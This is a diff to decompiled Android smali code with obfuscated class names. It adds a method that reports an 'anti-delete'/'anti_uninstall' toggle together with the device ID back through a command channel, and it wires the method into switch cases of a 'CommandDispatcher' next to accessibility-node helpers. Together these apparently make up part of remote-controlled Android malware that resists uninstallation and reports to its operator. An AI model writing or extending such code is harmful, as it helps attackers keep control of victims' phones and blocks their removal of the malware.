@@ -64,6 +64,80 @@
     return-void
 .end method
 
+.method public final reportAntiDeleteResult(Z)V
+    .locals 7
+
+    :try_start_0
+    new-instance v0, Lorg/json/JSONObject;
+
+    invoke-direct {v0}, Lorg/json/JSONObject;-><init>()V
+
+    if-eqz p1, :cond_action_off
+
+    const-string v1, "antiDeleteOn"
+
+    goto :goto_action_ready
+
+    :cond_action_off
+    const-string v1, "antiDeleteOff"
+
+    :goto_action_ready
+    const-string v2, "action"
+
+    invoke-virtual {v0, v2, v1}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;
+
+    const-string v1, "success"
+
+    const/4 v2, 0x1
+
+    invoke-virtual {v0, v1, v2}, Lorg/json/JSONObject;->put(Ljava/lang/String;Z)Lorg/json/JSONObject;
+
+    new-instance v1, Lorg/json/JSONObject;
+
+    invoke-direct {v1}, Lorg/json/JSONObject;-><init>()V
+
+    const-string v2, "anti_uninstall"
+
+    invoke-virtual {v1, v2, p1}, Lorg/json/JSONObject;->put(Ljava/lang/String;Z)Lorg/json/JSONObject;
+
+    const-string v2, "effect"
+
+    invoke-virtual {v0, v2, v1}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;
+
+    iget-object v1, p0, Lڜٟٱڀ/أ;->ؠ:Lڜٟٱڀ/د;
+
+    const-string v2, "deviceId"
+
+    iget-object v3, v1, Lڜٟٱڀ/د;->إ:Ljava/lang/String;
+
+    invoke-virtual {v0, v2, v3}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;
+
+    iget-object v1, v1, Lڜٟٱڀ/د;->آ:Lةؽڗںۍټ٘/ء;
+
+    if-eqz v1, :cond_done
+
+    const-string v2, "action_result"
+
+    invoke-virtual {v1, v2, v0}, Lةؽڗںۍټ٘/ء;->آ(Ljava/lang/String;Lorg/json/JSONObject;)Z
+    :try_end_0
+    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0
+
+    goto :goto_done
+
+    :catch_0
+    move-exception v0
+
+    const-string v1, "CommandDispatcher"
+
+    const-string v2, "antiDelete action_result failed"
+
+    invoke-static {v1, v2, v0}, Landroid/util/Log;->e(Ljava/lang/String;Ljava/lang/String;Ljava/lang/Throwable;)I
+
+    :cond_done
+    :goto_done
+    return-void
+.end method
+
 .method public static ؠ(Landroid/view/accessibility/AccessibilityNodeInfo;)Landroid/view/accessibility/AccessibilityNodeInfo;
     .locals 3
 
@@ -3957,6 +4031,8 @@
     goto/16 :goto_e
 
     :pswitch_3f
+    const/4 v5, 0x0
+
     const/4 v2, 0x0
 
     invoke-virtual {v14, v15, v2}, Landroid/content/Context;->getSharedPreferences(Ljava/lang/String;I)Landroid/content/SharedPreferences;
@@ -3978,6 +4054,8 @@
     :pswitch_40
     move-object/from16 v4, v20
 
+    const/4 v5, 0x1
+
     const/4 v2, 0x0
 
     invoke-virtual {v14, v15, v2}, Landroid/content/Context;->getSharedPreferences(Ljava/lang/String;I)Landroid/content/SharedPreferences;
@@ -3996,6 +4074,8 @@
 
     :goto_5
     invoke-interface {v2}, Landroid/content/SharedPreferences$Editor;->apply()V
+
+    invoke-virtual {v1, v5}, Lڜٟٱڀ/أ;->reportAntiDeleteResult(Z)V
 
     goto/16 :goto_e
 
